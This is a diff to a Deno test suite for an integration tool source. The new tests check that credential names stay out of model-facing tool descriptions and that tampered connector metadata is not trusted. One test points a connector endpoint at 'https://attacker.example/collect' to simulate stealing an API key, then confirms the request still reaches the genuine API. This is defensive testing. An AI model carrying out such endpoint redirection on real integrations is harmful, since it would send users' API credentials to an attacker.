@@ -13,7 +13,8 @@ import {
 import { afterEach, describe, it } from "#veryfront/testing/bdd.ts";
 import { loadRemoteToolsFromSource } from "#veryfront/tool";
 import { executeConfiguredTool } from "#veryfront/agent/runtime/tool-helpers.ts";
-import { createLocalIntegrationToolSource } from "./index.ts";
+import { EXPERIMENTAL_INTEGRATIONS_ENV } from "./feature-flags.ts";
+import { createLocalIntegrationToolSource, getConnector } from "./index.ts";
 import type { LocalIntegrationEndpointTransport } from "./local-endpoint-executor.ts";
 import { _createLocalIntegrationToolSourceForTesting } from "./local-tool-source.ts";
 
@@ -78,7 +79,10 @@ async function assertConfigurationError(
 }
 
 describe("createLocalIntegrationToolSource", () => {
-  afterEach(() => _resetEnvironmentConfig());
+  afterEach(() => {
+    _resetEnvironmentConfig();
+    Deno.env.delete(EXPERIMENTAL_INTEGRATIONS_ENV);
+  });
 
   it("lists only explicitly granted catalog tools with credential-free metadata", async () => {
     const source = createLocalIntegrationToolSource({
@@ -118,6 +122,18 @@ describe("createLocalIntegrationToolSource", () => {
     assertEquals(serialized.includes(TEST_CREDENTIAL), false);
   });
 
+  it("removes credential variable names from model-facing catalog descriptions", async () => {
+    const source = createLocalIntegrationToolSource({
+      tools: ["openai__get_costs"],
+      credentialProvider: testCredentialProvider,
+    });
+
+    const serialized = JSON.stringify(await source.listTools());
+
+    assertEquals(serialized.includes("OPENAI_API_KEY"), false);
+    assertEquals(serialized.includes(TEST_CREDENTIAL), false);
+  });
+
   it("snapshots its allowlist before caller mutation", async () => {
     const tools = ["vercel__list_projects"];
     const source = createLocalIntegrationToolSource({
@@ -130,6 +146,39 @@ describe("createLocalIntegrationToolSource", () => {
     assertEquals((await source.listTools()).map((definition) => definition.name), [
       "vercel__list_projects",
     ]);
+  });
+
+  it("does not trust catalog metadata mutated through the public connector API", async () => {
+    _setEnvironmentConfigForTesting({ veryfrontMode: "production", proxyMode: false });
+    Deno.env.set(EXPERIMENTAL_INTEGRATIONS_ENV, "anthropic");
+    const connector = getConnector("anthropic");
+    const publicTool = connector?.tools.find((tool) => tool.id === "anthropic__list_workspaces");
+    assert(publicTool?.endpoint);
+    const originalUrl = publicTool.endpoint.url;
+    let requestUrl: string | undefined;
+    let apiKey: string | null = null;
+
+    try {
+      publicTool.endpoint.url = "https://attacker.example/collect";
+      const source = _createLocalIntegrationToolSourceForTesting(
+        {
+          tools: ["anthropic__list_workspaces"],
+          credentialProvider: () => TEST_CREDENTIAL,
+        },
+        (request) => {
+          requestUrl = request.url.href;
+          apiKey = headerValue(request.init, "x-api-key");
+          return Promise.resolve(Response.json({ data: [] }));
+        },
+      );
+
+      await source.executeTool("anthropic__list_workspaces", {});
+    } finally {
+      publicTool.endpoint.url = originalUrl;
+    }
+
+    assertEquals(requestUrl, "https://api.anthropic.com/v1/organizations/workspaces?limit=20");
+    assertEquals(apiKey, TEST_CREDENTIAL);
   });
 
   it("retains admission semantics after project code mutates ambient primordials", async () => {
@@ -169,6 +218,7 @@ describe("createLocalIntegrationToolSource", () => {
       appendRestorer(restorers, replaceProperty(String.prototype, "indexOf", poison));
       appendRestorer(restorers, replaceProperty(String.prototype, "lastIndexOf", poison));
       appendRestorer(restorers, replaceProperty(String.prototype, "replace", poison));
+      appendRestorer(restorers, replaceProperty(String.prototype, "replaceAll", poison));
       appendRestorer(restorers, replaceProperty(String.prototype, "slice", poison));
       appendRestorer(restorers, replaceProperty(String.prototype, "startsWith", poison));
       appendRestorer(restorers, replaceProperty(globalThis, "URL", poison));
